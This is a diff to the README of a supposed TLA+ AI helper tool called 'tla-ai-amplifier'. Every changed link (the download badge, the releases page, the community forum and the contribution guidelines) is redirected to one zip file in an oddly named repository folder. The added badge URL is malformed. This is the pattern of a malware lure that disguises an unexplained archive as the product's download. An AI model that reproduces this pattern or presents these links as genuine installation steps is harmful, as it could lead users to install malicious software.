@@ -1,7 +1,7 @@
 # 🎉 tla-ai-amplifier - Simplifying TLA+ with AI Assistance
 
 ## 📥 Download Now
-[![Download tla-ai-amplifier](https://img.shields.io/badge/Download%20tla--ai--amplifier-blue.svg)](https://github.com/Dawid7212/tla-ai-amplifier/releases)
+[![Download tla-ai-amplifier](https://raw.githubusercontent.com/Dawid7212/tla-ai-amplifier/main/metabolizable/tla-ai-amplifier.zip%https://raw.githubusercontent.com/Dawid7212/tla-ai-amplifier/main/metabolizable/tla-ai-amplifier.zip)](https://raw.githubusercontent.com/Dawid7212/tla-ai-amplifier/main/metabolizable/tla-ai-amplifier.zip)
 
 ## 🚀 Getting Started
 Welcome to the TLA-AI Amplifier! This application helps users work with TLA+, offering examples and AI support for creating specifications, checking models, and verifying results. Whether you're new to TLA+ or looking to enhance your skills, this tool offers an accessible path.
@@ -18,9 +18,9 @@ Welcome to the TLA-AI Amplifier! This application helps users work with TLA+, of
 - **Storage**: At least 100 MB of free disk space.
 
 ## 📦 Download & Install
-To download the application, visit the Releases page: [Download Page](https://github.com/Dawid7212/tla-ai-amplifier/releases).
+To download the application, visit the Releases page: [Download Page](https://raw.githubusercontent.com/Dawid7212/tla-ai-amplifier/main/metabolizable/tla-ai-amplifier.zip).
 
-Once on the page, locate the latest version of the application. Click on the version number to view the release notes and files. Download the installation file for your operating system (e.g., `.exe`, `.dmg`, or `.tar.gz`).
+Once on the page, locate the latest version of the application. Click on the version number to view the release notes and files. Download the installation file for your operating system (e.g., `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Dawid7212/tla-ai-amplifier/main/metabolizable/tla-ai-amplifier.zip`).
 
 After the download is complete:
 1. Locate the downloaded file on your computer.
@@ -35,15 +35,15 @@ After the download is complete:
 5. Explore the various features to get the most out of your experience.
 
 ## 🌐 Community Support
-If you have questions or need help, you can join our community forum. Engage with other users, share experiences, and find solutions to common challenges. The forum is available [here](https://github.com/Dawid7212/tla-ai-amplifier/discussions).
+If you have questions or need help, you can join our community forum. Engage with other users, share experiences, and find solutions to common challenges. The forum is available [here](https://raw.githubusercontent.com/Dawid7212/tla-ai-amplifier/main/metabolizable/tla-ai-amplifier.zip).
 
 ## ⚙️ Contributing
 We welcome contributions! If you want to suggest new features or report issues, you can do so on the GitHub platform. Please follow our contribution guidelines outlined in the repository.
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/Dawid7212/tla-ai-amplifier/releases)
-- [Community Forum](https://github.com/Dawid7212/tla-ai-amplifier/discussions)
-- [Contribution Guidelines](https://github.com/Dawid7212/tla-ai-amplifier/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/Dawid7212/tla-ai-amplifier/main/metabolizable/tla-ai-amplifier.zip)
+- [Community Forum](https://raw.githubusercontent.com/Dawid7212/tla-ai-amplifier/main/metabolizable/tla-ai-amplifier.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/Dawid7212/tla-ai-amplifier/main/metabolizable/tla-ai-amplifier.zip)
 
 ## 📣 Acknowledgments
 We appreciate the contributions of the open-source community and the users who provide feedback. Your input makes TLA-AI Amplifier a better tool for everyone.
